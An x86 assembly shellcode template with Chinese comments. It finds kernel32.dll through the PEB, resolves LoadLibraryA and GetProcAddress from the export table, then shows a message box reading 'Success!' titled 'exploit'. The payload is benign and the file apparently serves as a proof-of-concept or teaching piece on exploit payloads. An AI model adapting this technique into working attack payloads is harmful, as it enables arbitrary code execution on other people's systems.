		.386
		.model flat,stdcall
		option casemap:none

		.code
	
start:

		assume fs:nothing
		push ebp
		mov ebp,esp
		xor ecx,ecx

		push ecx
		push ecx
		
		push 'tio'
		push 'lpxe'	;"exploit"
		
		push '!'
		push 'ssec'
		push 'ccuS' ;"Success!"
		
		push '23'
		push 'resu'	;"user32"
		
		push 'Axo'
		push 'Bega'
		push 'sseM' ;"MssageBoxA"
		
		
		mov eax,fs:[ecx+30h]	;peb 
		mov eax,[eax + 0ch] 	;ldr
		mov esi,[eax + 1ch]	;module list
next_module:
		mov   eax,[esi+08h]   
		mov   edi,[esi+20h]   
		mov   esi,[esi]
		cmp  [edi+12*2],cx     
		jnz  next_module       
		mov  esi,eax   ;esi :kernel32.dll MZ头部

find_function:
		
		
		
		mov eax,[esi+3ch]	;pe头部
		mov ecx,[esi+eax+78h]
		add ecx,esi		;导出表
		mov ebx,[ecx+20h]
		add ebx,esi		;导出函数名称表
		xor edi,edi
		dec edi
		
		pushad
		
;搜索	LoadLibrayA	地址		
nexta1:
		inc edi
		mov edx,[ebx+edi*4]
		add edx,esi
		mov eax,[edx]			;find "LoadLibrayA"
		cmp eax,64616F4Ch		;"Load"	
		jnz  nexta1
		mov eax,[edx+4]
		cmp eax,7262694Ch		;"Libr"	
		jnz  nexta1
		mov eax,[edx+8]	
		cmp eax,41797261h		;"aryA"
		jnz  nexta1
		mov ebx,[ecx+24h]
		add ebx,esi
		mov di,[ebx+2*edi]
		mov ebx,[ecx+1ch]
		add ebx,esi
		add esi,[ebx+4*edi]
		mov eax,esi
		
		mov [ebp-4],eax
		
		popad
		
;搜索	GetProcAddress	地址
nexta2:
		inc edi
		mov edx,[ebx+edi*4]
		add edx,esi
		mov eax,[edx]			;find "GetProcAddress"
		cmp eax,50746547h		;"GetP"	
		jnz  nexta2
		mov eax,[edx+4]
		cmp eax,41636F72h		;"rocA"	
		jnz  nexta2
		mov eax,[edx+8]	
		cmp eax,65726464h		;"ddre"
		jnz  nexta2
		mov eax,[edx+0ch]	
		cmp ax,7373h			;"ss"
		jnz  nexta2
		mov ebx,[ecx+24h]
		add ebx,esi
		mov di,[ebx+2*edi]
		mov ebx,[ecx+1ch]
		add ebx,esi
		add esi,[ebx+4*edi]
		mov eax,esi		
		
		mov [ebp-8],eax
		
		
		lea ebx, [ebp-24h]
		push ebx
		call DWORD ptr [ebp-4]	;Call LoadLibraryA("user32")
		
		lea ebx, [ebp-30h]
		push ebx
		push eax
		call DWORD ptr [ebp-8]	;Call GetProcAddress("MessageBoxA")
		
		
		push 1
		lea ebx, [ebp-10h]
		push ebx
		lea ebx, [ebp-1ch]
		push ebx
		push 0
		call eax
		
		
		add esp , 30h
		pop ebp
		ret
		
		end start